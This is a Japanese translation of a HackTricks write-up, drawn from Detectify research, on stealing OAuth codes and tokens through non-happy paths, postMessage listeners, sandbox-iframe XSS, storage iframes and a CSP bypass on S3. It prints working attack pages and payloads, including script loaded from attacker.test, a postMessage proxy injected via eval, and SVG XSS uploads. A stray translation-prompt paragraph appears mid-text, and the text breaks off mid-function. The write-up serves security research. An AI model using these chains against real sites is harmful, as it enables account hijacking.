# OAuth - ハッピーパス、XSS、iframe、およびポストメッセージを使用してコードと状態の値を漏洩させる

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出**してください。

</details>

**このコンテンツは** [**https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url**](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url) **から取得されました。**

## 異なるOAuthダンスの説明

### レスポンスタイプ

まず、OAuthダンスで使用できる異なるレスポンスタイプがあります。これらのレスポンスは、**ユーザーとしてログインするためのトークンまたは必要な情報を付与**します。

最も一般的な3つは次のとおりです。

1. **`code` + `state`**。 **コード**は、OAuthプロバイダーをサーバーサイドで呼び出してトークンを取得するために使用されます。 **state**パラメータは、**正しいユーザーが呼び出しを行っていることを検証するために使用**されます。サーバーサイドの呼び出しを行う前に、OAuthクライアントは状態パラメータを検証する責任があります。
2. **`id_token`**。 OAuthプロバイダーの公開証明書を使用して署名されたJSON Web Token **(JWT)**を使用して、提供されたアイデンティティが実際に主張されているものであることを検証します。
3. **`token`**。 サービスプロバイダーのAPIで使用される**アクセストークン**です。

### レスポンスモード

OAuthダンスでウェブサイトにコードまたはトークンを提供するために使用できる異なるモードがあります。以下は最も一般的な4つです。

1. **Query**。ウェブサイトにリダイレクトバックするためにクエリパラメータを送信します（`https://example.com/callback?code=xxx&state=xxx`）。 `code+state`に使用されます。 **コード**は**1回だけ使用**でき、コードを使用する場合は**OAuthクライアントシークレット**が必要です。
1. [このモードはトークンには推奨されていません](https://openid.net/specs/oauth-v2-multiple-response-types-1\_0-09.html#id\_token)。**トークンは複数回使用できず、サーバーログなどに保存されるべきではありません**。ほとんどのOAuthプロバイダーは、トークンではなくコードに対してこのモードをサポートしていません。例：
* Appleは`response_mode=query`を使用します。
* GoogleまたはFacebookは`response_type=code`を使用します。
2. **Fragment**。**フラグメントリダイレクト**を使用します（`https://example.com/callback#access_token=xxx`）。このモードでは、URLのフラグメント部分はサーバーログに表示されず、JavaScriptを使用してクライアントサイドでのみアクセスできます。このレスポンスモードはトークンに使用されます。例：
* AppleとMicrosoftは`response_mode=fragment`を使用します。
* Google、Facebook、Atlassianなどは`response_type`に`id_token`または`token`を含めます。
3. **Webメッセージ**。**ウェブサイトの固定されたオリジンにpostMessageを使用**します：\
`postMessage('{"access_token":"xxx"}','https://example.com')`\
サポートされている場合、さまざまなレスポンスタイプによく使用できます。例：
* Appleは`response_mode=web_message`を使用します。
* Googleは`redirect_uri=storagerelay://...`を使用します。
* Facebookは`redirect_uri=https://staticxx.facebook.com/.../connect/xd_arbiter/...`を使用します。
4. **Form-post**。有効な`redirect_uri`にフォームポストを使用し、**ウェブサイトに通常のPOSTリクエストを送信**します。これはコードとトークンに使用できます。例：
* Appleは`response_mode=form_post`を使用します。
* Google Sign-In（GSI）は`ux_mode=redirect&login_uri=https://example.com/callback`を使用します。

## `state`を意図的に破壊する <a href="#break-state-intentionally" id="break-state-intentionally"></a>

OAuth仕様では、`state`パラメータを`response_type=code`と組み合わせて使用することを推奨しています。これにより、フローを開始したユーザーがOAuthダンス後にコードを使用するユーザーであることが確認されます。

ただし、**`state`の値が無効な場合**、**`code`は消費されません**。なぜなら、最終的なウェブサイトが状態を検証する責任があるからです。つまり、攻撃者が有効な`state`を持つ被害者にログインフローリンクを送信できれば、OAuthダンスは被害者に対して失敗し、`code`はOAuthプロバイダーに送信されません。ただし、攻撃者がそれを取得できれば、コードは使用可能です。

1. 攻撃者は「Xでサインイン」というウェブサイトでサインインフローを開始します。
2. 攻撃者は`state`の値を使用して、被害者がOAuthプロバイダーでサインインするためのリンクを構築しますが、
### レスポンスタイプ/レスポンスモードの切り替え

OAuthダンスのレスポンスタイプまたはレスポンスモードを変更すると、コードやトークンがウェブサイトにどのように送信されるかが変わり、予期しない動作が発生することがあります。私はOAuthプロバイダーがウェブサイトがサポートするレスポンスタイプやモードを制限するオプションを持っているのを見たことがありません。そのため、OAuthプロバイダーによっては、ノンハッピーパスに到達するために少なくとも2つ以上のレスポンスタイプを変更できることがよくあります。

また、複数のレスポンスタイプをリクエストすることも可能です。[複数のレスポンスタイプがリクエストされた場合に、リダイレクトURIに値を提供する方法が説明されている仕様](https://openid.net/specs/oauth-v2-multiple-response-types-1\_0-09.html#Encoding)があります。

> もし、リクエストで`response_type`がクエリ文字列内で完全にエンコードされたデータの返却を要求する値のみを含む場合、この複数の値を持つ`response_type`に対するレスポンスの返却データは、クエリ文字列内で完全にエンコードされる必要があります。この推奨事項は、成功およびエラーレスポンスの両方に適用されます。
>
> もし、リクエストで`response_type`がフラグメント内で完全にエンコードされたデータの返却を要求する値を含む場合、この複数の値を持つ`response_type`に対するレスポンスの返却データは、フラグメント内で完全にエンコードされる必要があります。この推奨事項は、成功およびエラーレスポンスの両方に適用されます。

この仕様が正しく守られている場合、ウェブサイトに`code`パラメータを送信することができますが、同時に`id_token`も要求する場合、`code`パラメータはクエリ文字列ではなくフラグメントの一部として送信されます。

Googleのサインインの場合、以下のことを意味します：
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
次に、`https://example.com/callback?code=xxx&state=yyy` にリダイレクトされます。しかし、以下のような問題があります:
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code,id_token&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
`https://example.com/callback#code=xxx&state=yyy&id_token=zzz` にリダイレクトされます。

同じ考え方は、Appleを使用する場合も適用されます。
```
https://appleid.apple.com/auth/authorize?
response_type=code&
response_mode=query&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
以下のURLにリダイレクトされます：`https://example.com/callback?code=xxx&state=yyy`、ただし：
```
https://appleid.apple.com/auth/authorize?
response_type=code+id_token&
response_mode=fragment&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
あなたを`https://example.com/callback#code=xxx&state=yyy&id_token=zzz`にリダイレクトします。

## ハッピーでないパス

研究の著者は、**OAuth経由でユーザーがリダイレクトされる間違ったURLへのノンハッピーなパス**を呼びました。これは、クライアントにトークンと有効な状態+コードが提供された場合でも、**期待されるページに到達しない**場合、その**情報は適切に消費されない**ため、攻撃者が「ノンハッピーなパス」からその情報を**漏洩**する方法を見つけると、**アカウントを乗っ取る**ことができます。

デフォルトでは、OAuthフローは期待されるパスに到達しますが、いくつかの潜在的な**設定ミス**があるかもしれません。これにより、攻撃者が特定の初期OAuthリクエストを作成し、**ユーザーがログイン後にノンハッピーなパスに到達する**ことができます。

### リダイレクトURIの不一致

これらの「一般的な」**設定ミス**は、OAuth通信の**リダイレクトURL**で見つかりました。

[**仕様**](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-19#section-2.1)は厳密に、リダイレクトURLは定義されたURLと厳密に比較されるべきであり、ポートの変更以外の変更は許可されないことを示しています。しかし、一部のエンドポイントでは、いくつかの変更が許可されていました。

### リダイレクトURIパスの追加

一部のOAuthプロバイダは、`redirect_uri`のパスに追加データを追加することを許可しています。これは、「リダイレクトURIの大文字小文字の変更」と同じように仕様を破っています。例えば、`https://example.com/callback`のリダイレクトURIに対して、以下のように送信します：
```
response_type=id_token&
redirect_uri=https://example.com/callbackxxx
```
次に、`https://example.com/callbackxxx#id_token` へのリダイレクトが行われます。

### Redirect-uriパラメータの追加

一部のOAuthプロバイダは、`redirect_uri` に追加のクエリまたはフラグメントパラメータを追加することを許可しています。これを利用して、URLに追加される同じパラメータを提供することで、非ハッピーパスをトリガーすることができます。たとえば、`https://example.com/callback` のリダイレクトURIを持つ場合、次のように送信します：
```
response_type=code&
redirect_uri=https://example.com/callback%3fcode=xxx%26
```
次の場合、リダイレクトは`https://example.com/callback?code=xxx&code=real-code`になります。ウェブサイトが**同じ名前の複数のパラメータを受け取る場合、これは非ハッピーパスをトリガーする可能性もあります**。`token`と`id_token`にも同じことが当てはまります。
```
response_type=code&
redirect_uri=https://example.com/callback%23id_token=xxx%26
```
### リダイレクトURIの残り物や設定ミス

`redirect_uri` 値を含むすべてのサインインURLを収集する際に、他のリダイレクトURIの値も有効であるかどうかをテストすることもできます。テストしたウェブサイトの中で保存した125種類の異なるGoogleサインインフローのうち、5つのウェブサイトではスタートページも有効な `redirect_uri` として機能していました。例えば、使用されている `redirect_uri=https://auth.example.com/callback` の場合、これらの5つのケースでは以下のいずれかも有効でした：

- `redirect_uri=https://example.com/`
- `redirect_uri=https://example.com`
- `redirect_uri=https://www.example.com/`
- `redirect_uri=https://www.example.com`

これは特に `id_token` や `token` を実際に使用しているウェブサイトにとって興味深いものでした。なぜなら、`response_type=code` の場合、OAuthプロバイダーはトークンを取得するOAuthダンスの最後のステップで `redirect_uri` を検証するからです。

## ガジェット1：弱いまたはオリジンチェックのないURLを漏洩させるpostMessageリスナー

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-1-1024x582.png)

**この例では、トークン/コードが送信される最終的な非ハッピーパスで、location.hrefを漏洩させるポストリクエストメッセージが送信されています。**\
例えば、ウェブサイトにロードされている人気のあるサイトのアナリティクスSDKがありました：

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example1.png)

このSDKは、メッセージタイプが一致した場合に以下のメッセージを送信するpostMessageリスナーを公開していました：

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example2.png)

異なるオリジンからそれにメッセージを送信すると、
```javascript
openedwindow = window.open('https://www.example.com');
...
openedwindow.postMessage('{"type":"sdk-load-embed"}','*');
```
以下は、ハッキング技術に関する本の内容です。以下の内容は、ファイル/hive/hacktricks/pentesting-web/oauth-to-account-takeover/oauth-happy-paths-xss-iframes-and-post-messages-to-leak-code-and-state-values.mdからのものです。関連する英語のテキストを日本語に翻訳し、翻訳を返し、マークダウンとHTMLの構文を正確に保ちます。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/ SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加のものは追加しないでください。

---

ウィンドウには、ウェブサイトの`location.href`を含むメッセージが表示されます。

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example3.png)

攻撃に使用できるフローは、コードとトークンがサインインフローでどのように使用されるかに依存しますが、アイデアは次のとおりです。

### **攻撃**

1. 攻撃者は、OAuthダンスで非ハッピーパスになるように準備された**作成済みのリンク**を被害者に送信します。
2. 被害者がリンクを**クリック**します。新しいタブが開き、攻撃対象のウェブサイトのOAuthプロバイダーの1つで**サインイン**フローが表示されます。
3. 攻撃対象のウェブサイトで非ハッピーパスがトリガーされ、**脆弱なpostMessageリスナーがURL付きのままページに読み込まれます**。
4. 攻撃者が送信した**元のタブ**は、新しいタブに対して**複数のpostMessage**を送信し、postMessageリスナーが現在のURLを漏洩させるようにします。
5. 攻撃者が送信した元のタブは、それに送信されたメッセージを**受信**します。URLがメッセージで返ってきたとき、**コードとトークンが抽出**され、攻撃者に送信されます。
6. 攻撃者は、非ハッピーパスに到達したコードまたはトークンを使用して、被害者としてサインインします。

## ガジェット2：URLを取得するsandbox/third-partyドメイン上のXSS

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-2-1024x582.png)

&#x20;

## **ガジェット2：例1、sandbox iframeからwindow.nameを盗む**

これは、OAuthダンスが終了した**ページにiframeが読み込まれている**ものです。**iframe**の**名前**は、**`window.location`オブジェクトのJSON文字列化バージョン**でした。これは、iframe内のページが親によって`window.name`を設定できる古い方法です。
```javascript
i = document.createElement('iframe');
i.name = JSON.stringify(window.location)
i.srcdoc = '<script>console.log("my name is: " + window.name)</script>';
document.body.appendChild(i)
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget2-example2.png)

**iframeに読み込まれたドメインには、単純なXSSもありました**:
```
https://examplesandbox.com/embed_iframe?src=javascript:alert(1)
```
### 攻撃

もし、あるドメインのウィンドウに **XSS** がある場合、そのウィンドウは同じオリジンの他のウィンドウにアクセスすることができます。これは、ウィンドウ間に親子/オープナーの関係がある場合に起こります。

これは、攻撃者がXSSを悪用して、クラフトされた **OAuthリンクを読み込む新しいタブ** を作成することができることを意味します。このリンクは、**トークンを名前に持つiframeを読み込むパスで終わる** ものです。その後、XSSが悪用されたページから、iframeの名前を読み取ることが可能になります。これは、iframeの親ページにオープナーがあるためです。そして、それを外部に漏洩させることができます。

具体的には以下の手順です：

1. 悪意のあるページを作成し、XSSを含むsandboxのiframeを埋め込みます：

```html
<div id="leak"><iframe src="https://examplesandbox.com/embed_iframe?src=javascript:
x=createElement('script'),
x.src='//attacker.test/inject.js',
document.body.appendChild(x);"
style="border:0;width:500px;height:500px"></iframe></div>
```

2. sandboxで読み込まれる私のスクリプトで、被害者に使用するリンクを置き換えます：

```javascript
document.body.innerHTML =
'<a href="#" onclick="
b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
Click here to hijack token</a>';
```

また、リンクが開かれ、アタッカーのページ上のiframeにアクセスできるようになったかどうかを確認するためのスクリプトも開始しました。これは、アタッカーのページと同じオリジンを持つiframeの `window.name` を取得するためです。

```javascript
x = setInterval(function() {
if(parent.window.b &&
parent.window.b.frames[0] &&
parent.window.b.frames[0].window &&
parent.window.b.frames[0].window.name) {
top.postMessage(parent.window.b.frames[0].window.name, '*');
parent.window.b.close();
clearInterval(x);
}
}, 500);
```

3. 攻撃者のページは、`window.name` として送信したメッセージを受信するだけです：

```html
<script>
window.addEventListener('message', function (e) {
if (e.data) {
document.getElementById('leak').innerText = 'We stole the token: ' + e.data;
}
});
</script>
```

## **ガジェット2: 例2、XSS + 親オリジンチェックを使用したiframe**

2番目の例では、XSSを使用したiframeが **ハッピーパスではないパス** で読み込まれ、**postMessageを使用してメッセージが許可されたのは`parent`ウィンドウだけ**でした。`initConfig` を要求する際に、`location.href` がメッセージとしてiframeに送信されました。

メインウィンドウは、以下のようにiframeを読み込みました：
```html
<iframe src="https://challenge-iframe.example.com/"></iframe>
```
そして、コンテンツは次のようになりました（実際のものよりもはるかに簡略化されていますが、攻撃をより良く説明するためです）：
```html
<script>
window.addEventListener('message', function (e) {
if (e.source !== window.parent) {
// not a valid origin to send messages
return;
}
if (e.data.type === 'loadJs') {
loadScript(e.data.jsUrl);
} else if (e.data.type === 'initConfig') {
loadConfig(e.data.config);
}
});
</script>
```
### 攻撃

この場合、**攻撃者はPost-message XSS脆弱性ページを含むiframeを読み込み**、**XSS**を悪用して**任意のJSを読み込みます**。\
この**JS**は**OAuthリンク**を**開きます**。ログイン後、最終ページにはURLにトークンが含まれ、iframe（XSS post-message脆弱性iframe）が読み込まれています。

その後、悪用されたXSSからの**任意のJS**には、**そのタブへのオープナー**があり、それによって**iframeにアクセス**し、親に`initConfig`（トークンを含むURL）を要求します。親ページはそれをiframeに渡し、それを**リークするように指示**します。

この場合、前の例と同様の方法を取ることができます：

1. **iframeが読み込まれたときにスクリプトをトリガーする**ために、**マルウェアページ**に**sandboxのiframeを埋め込む**。

```html
<div id="leak"><iframe
id="i" name="i"
src="https://challenge-iframe.example.com/"
onload="run()"
style="border:0;width:500px;height:500px"></iframe></div>
```
2. **マルウェアページがiframeの親**であるため、**postMessage（XSS）を使用してiframeにメッセージを送信**し、sandboxのオリジンでスクリプトを読み込むようにします。

```html
<script>
function run() {
i.postMessage({type:'loadJs',jsUrl:'https://attacker.test/inject.js'}, '*')
}
</script>
```
3. sandboxで読み込まれるスクリプトでは、コンテンツを**被害者のリンクに置き換えます**。

```javascript
document.body.innerHTML = '<a href="#" onclick="
b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
Click here to hijack token</a>';
```

また、リンクが開かれ、アクセスしたいiframeが存在するかどうかを定期的にチェックするスクリプトを開始し、iframeからメインウィンドウに対してJavaScriptを実行するためのpostMessageリスナーをアタッチしました。

```javascript
x = setInterval(function() {
if(b && b.frames[1]) {
b.frames[1].eval(
'onmessage=function(e) { top.opener.postMessage(e.data, "*") };' +
'top.postMessage({type:'initConfig'},"*")'
)
clearInterval(x)
}
}, 500);
```
4. iframeを読み込んだ攻撃者ページは、メインウィンドウのiframe内の注入されたpostMessageリスナープロキシから送信されたメッセージを受信できます。

```html
<script>
window.addEventListener('message', function (e) {
if (e.data) {
document.getElementById('leak').innerText = 'We stole the token: ' + JSON.stringify(e.data);
}
});
</script>
```

## ガジェット3：APIを使用して範囲外のURLを取得する

![](https://labs.detectify.com/wp-content/uploads/2022/06/Gadget-3--1024x582.png)

&#x20;

このガジェットは最も楽しいものでした。被害者をどこかに送り、異なる場所から機密データを取得することは何か満足感があります。

## **ガジェット3：例1、オリジンチェックのないストレージiframe**

最初の例では、トラッキングデータのために外部サービスを使用しました。このサービスは「ストレージiframe」を追加しました：
```html
<iframe
id="tracking"
name="tracking"
src="https://cdn.customer1234.analytics.example.com/storage.html">
</iframe>
```
メインウィンドウは、postMessageを使用してこのiframeと通信し、追跡データを送信します。このデータは、`storage.html`が配置されているオリジンのlocalStorageに保存されます。
```javascript
tracking.postMessage('{"type": "put", "key": "key-to-save", "value": "saved-data"}', '*');
```
メインウィンドウもこのコンテンツを取得できます：
```javascript
tracking.postMessage('{"type": "get", "key": "key-to-save"}', '*');
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example1.png)

初期化時にiframeがロードされると、`location.href`を使用してユーザーの最後の位置のためのキーが保存されました。
```javascript
tracking.postMessage('{"type": "put", "key": "last-url", "value": "https://example.com/?code=test#access_token=test"}', '*');
```
もしもこの元の場所と何らかの方法で通信でき、コンテンツを送信させることができれば、このストレージから`location.href`を取得することができます。サービスのpostMessageリスナーには、オリジンのブロックリストと許可リストがありました。アナリティクスサービスは、ウェブサイトがどのオリジンを許可または拒否するかを定義することができるようです。
```javascript
var blockList = [];
var allowList = [];
var syncListeners = [];

window.addEventListener('message', function(e) {
// If there's a blockList, check if origin is there and if so, deny
if (blockList && blockList.indexOf(e.origin) !== -1) {
return;
}
// If there's an allowList, check if origin is there, else deny
if (allowList && allowList.indexOf(e.origin) == -1) {
return;
}
// Only parent can talk to it
if (e.source !== window.parent) {
return;
}
handleMessage(e);
});

function handleMessage(e) {
if (data.type === 'sync') {
syncListeners.push({source: e.source, origin: e.origin})
} else {
...
}

window.addEventListener('storage', function(e) {
for(var i = 0; i < syncListeners.length; i++) {
syncListeners[i].source.postMessage(JSON.stringify({type: 'sync', key: e.key, value: e.newValue}), syncListeners[i].origin);
}
}
```
また、`allowList`に基づいた有効なオリジンがある場合、同期を要求することもできます。これにより、このウィンドウで行われたlocalStorageの変更が行われたときに、それらが送信されます。

### 攻撃

OAuthダンスの非ハッピーパスでこのストレージがロードされたウェブサイトでは、`allowList`オリジンが定義されていませんでした。**したがって、オリジンがウィンドウの`parent`である場合、任意のオリジンがpostMessageリスナーと通信できるようになりました**。

1. 悪意のあるページを作成し、ストレージコンテナのiframeを埋め込み、iframeの読み込み時にスクリプトをトリガーするonloadをアタッチしました。

```html
<div id="leak"><iframe
id="i" name="i"
src="https://cdn.customer12345.analytics.example.com/storage.html"
onload="run()"></iframe></div>
```

2. 悪意のあるページがiframeの親になったため、`allowList`にオリジンが定義されていないため、悪意のあるページはiframeにメッセージを送信してストレージにストレージの更新に関するメッセージを送信することができました。また、悪意のあるページにリスナーを追加して、ストレージからの同期更新を受け取ることもできました。

```html
<script>
function run() {
i.postMessage({type:'sync'}, '*')
}
window.addEventListener('message', function (e) {
if (e.data && e.data.type === 'sync') {
document.getElementById('leak').innerText = 'トークンを盗みました：' + JSON.stringify(e.data);
}
});
</script>
```

3. 悪意のあるページには、被害者がクリックするための通常のリンクも含まれていました。

```html
<a href="https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?..."
target="_blank">ここをクリックしてトークンを乗っ取る</a>';
```

4. 被害者はリンクをクリックし、OAuthダンスを経て、トラッキングスクリプトとストレージのiframeがロードされた非ハッピーパスに到達します。ストレージのiframeは`last-url`の更新を受け取ります。localStorageが更新されたため、悪意のあるページのiframe内で`window.storage`イベントがトリガーされ、ストレージが変更されるたびに更新を受け取るようになった悪意のあるページは、被害者の現在のURLを含むpostMessageを受け取ります。

<figure><img src="https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example2.png" alt=""><figcaption></figcaption></figure>

## **ガジェット3：例2、CDNでの顧客の混乱 - オリジンチェックのないDIYストレージSVG**

解析サービス自体にバグバウンティがあったため、ストレージのiframeに適切なオリジンが設定されているウェブサイトでもURLを漏洩させる方法を見つけることに興味がありました。

顧客の部分を除いた`cdn.analytics.example.com`ドメインをオンラインで検索し始めたところ、このCDNにはサービスの顧客がアップロードした画像も含まれていることに気付きました。
```
https://cdn.analytics.example.com/img/customer42326/event-image.png
https://cdn.analytics.example.com/img/customer21131/test.png
```
私もこのCDNで`Content-type: image/svg+xml`としてインラインで提供されているSVGファイルを見つけました。
```
https://cdn.analytics.example.com/img/customer54353/icon-register.svg
```
私はサービスのトライアルユーザーとして登録し、自分のアセットをアップロードしました。それはCDNにも表示されました。
```
https://cdn.analytics.example.com/img/customer94342/tiger.svg
```
興味深いのは、CDNのために顧客固有のサブドメインを使用した場合でも、画像が提供されることです。このURLは機能しました：
```
https://cdn.customer12345.analytics.example.com/img/customer94342/tiger.svg
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example4.png)

これは、ID #94342の顧客が顧客 #12345 のストレージ内のSVGファイルをレンダリングできることを意味します。

私は、単純なXSSペイロードを持つSVGファイルをアップロードしました：

`https://cdn.customer12345.analytics.example.com/img/customer94342/test.svg`
```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 500 500" width="100%" height="100%" version="1.1">
<script xlink:href="data:,alert(document.domain)"></script>
</svg>
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example3.png)

素晴らしくありません。CDNは`img/`以下のすべてに`Content-Security-Policy: default-src 'self'`ヘッダーを追加しました。また、サーバーヘッダーにはS3が言及されており、コンテンツがS3バケットにアップロードされたことが明らかになりました。

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example5.png)

S3の興味深い特徴の1つは、ディレクトリが実際にはS3ではないということです。キーの前のパスは「プレフィックス」と呼ばれます。つまり、S3はURLエンコードされているかどうかに関係なく、URL内のすべてのスラッシュをURLエンコードすればコンテンツを提供します。URL内の`img/`を`img%2f`に変更すると、画像は引き続き解決されます。ただし、その場合、CSPヘッダーが削除され、XSSがトリガーされます。

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example6.png)

その後、通常の`storage.html`と同じ形式のストレージハンドラーとpostMessageリスナーを作成するSVGをアップロードしましたが、`allowList`は空です。これにより、ストレージと通信できる許可されたオリジンを適切に定義しているウェブサイトでも同じ種類の攻撃が可能になりました。

次のようなSVGをアップロードしました：
```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 5 5" width="100%" height="100%" version="1.1">
<script xlink:href="data:application/javascript;base64,dmFyIGJsb2NrTGlzdCA9IFtdOwp2YXIgYWxsb3dMaXN0ID0gW107Ci4uLg=="></script>
</svg>
```
次に、例1と同じ手法を使用できますが、`storage.html`をiframe化する代わりに、URLエンコードされたスラッシュを含むSVGをiframe化することができます。
```html
<div id="leak"><iframe
id="i" name="i"
src="https://cdn.customer12345.analytics.example.com/img%2fcustomer94342/listener.svg"
onload="run()"></iframe></div>
```
サイト自体はこれを修正することはできないため、代わりにCDNを担当するアナリティクスプロバイダーに報告しました：

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)

サードパーティの設定ミスバグを調査するアイデアは、トークンの漏洩を達成するための複数の方法があることを確認するためでした。サードパーティにはバグバウンティがあったため、これは同じ種類のバグの別の受信者にすぎませんでした。違いは、影響がアナリティクスサービスのすべての顧客に及ぶことです。この場合、サードパーティの顧客はツールを適切に設定してデータを漏洩させないようにする能力を実際に持っていました。ただし、機密データはサードパーティに送信されたため、顧客の適切なツールの設定を完全にバイパスする方法があるかどうかを確認することは興味深いものでした。

## **ガジェット3：例3、チャットウィジェットAPI**

最後の例は、ウェブサイトのすべてのページ、エラーページを含むチャットウィジェットに基づいています。複数のpostMessageリスナーがあり、そのうちの1つは適切なオリジンチェックなしでチャットポップアップを開始することができます。別のリスナーは、チャットウィジェットが初期化呼び出しと現在のユーザーに使用されるチャットAPIトークンを受け取るための厳格なオリジンチェックを持っていました。
```html
<iframe src="https://chat-widget.example.com/chat"></iframe>
<script>
window.addEventListener('message', function(e) {
if (e.data.type === 'launch-chat') {
openChat();
}
});

function openChat() {
...
}

var chatApiToken;
window.addEventListener('message', function(e) {
if (e.origin === 'https://chat-widget.example.com') {
if (e.data.type === 'chat-widget') {
if (e.data.key === 'api-token') {
chatApiToken = e.data.value;
}
if(e.data.key === 'init') {
chatIsLoaded();
}
}
}
});

function chatIsLoaded() {
...
}
</script>
```
チャットのiframeが読み込まれた場合：

1. チャットウィジェットのlocalStorageにchat-api-tokenが存在する場合、それをapi-tokenとして親ウィンドウにpostMessageで送信します。chat-api-tokenが存在しない場合は何も送信しません。
2. iframeが読み込まれたら、`{"type": "chat-widget", "key": "init"}`というpostMessageを親ウィンドウに送信します。

メインウィンドウでチャットアイコンをクリックした場合：

1. すでにchat-api-tokenが送信されていない場合、チャットウィジェットは新しいトークンを作成し、自身のオリジンのlocalStorageに保存し、親ウィンドウにpostMessageで送信します。
2. 親ウィンドウはチャットサービスにAPIコールを行います。APIエンドポイントは、サービスに設定された特定のウェブサイトに対してCORS制限があります。リクエストを送信するためには、有効な`Origin`ヘッダをAPIコールに提供する必要があります。このヘッダには、chat-api-tokenも含まれます。
3. メインウィンドウからのAPIコールには、`location.href`が含まれ、それが訪問者の「現在のページ」としてchat-api-tokenとともに登録されます。レスポンスには、チャットセッションを開始するためのウェブソケットに接続するためのトークンが含まれます。

```json
{
"api_data": {
"current_page": "https://example.com/#access_token=test",
"socket_key": "xxxyyyzzz",
...
}
}
```

この例では、chat-api-tokenの公開は常にチャットウィジェットiframeの親に公開されることに気付きました。chat-api-tokenを取得した場合、ブラウザに対してのみCORSヘッダが重要であるため、サーバーサイドのリクエストでトークンを使用してサーバーサイドのリクエストを行い、自分自身の人工的な`Origin`ヘッダをAPIコールに追加することができました。これにより、次のチェーンが生成されました：

1. チャットウィジェットのiframeを埋め込んだ悪意のあるページを作成し、chat-api-tokenを受け取るためのpostMessageリスナーを追加しました。また、2秒間にapi-tokenを受け取っていない場合にiframeをリロードするイベントをトリガーしました。これは、チャットを開始していない被害者もサポートするためであり、リモートでチャットを開始することができるため、まずはチャットapi-tokenが必要でした。

```html
<div id="leak"><iframe
id="i" name="i"
src="https://chat-widget.example.com/chat" onload="reloadToCheck()"></iframe></div>
<script>
var gotToken = false;
function reloadToCheck() {
if (gotToken) return;
setTimeout(function() {
document.getElementById('i').src = 'https://chat-widget.example.com/chat?' + Math.random();
}, 2000);
}
window.onmessage = function(e) {
if (e.data.key === 'api-token') {
gotToken = true;
lookInApi(e.data.value);
}
}
launchChatWindowByPostMessage();
</script>
```
2. 悪意のあるページにリンクを追加し、URLにトークンが含まれるチャットウィジェットのページを開くためのサインインフローを開きます：

```
<a href="#" onclick="b=window.open('https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...');">Click here to hijack token</a>
```
3. `launchChatWindowByPostMessage()`関数は、メインウィンドウに対して継続的にpostMessageを送信し、チャットウィジェットを起動します：

```javascript
function launchChatWindowByPostMessage() {
var launch = setInterval(function() {
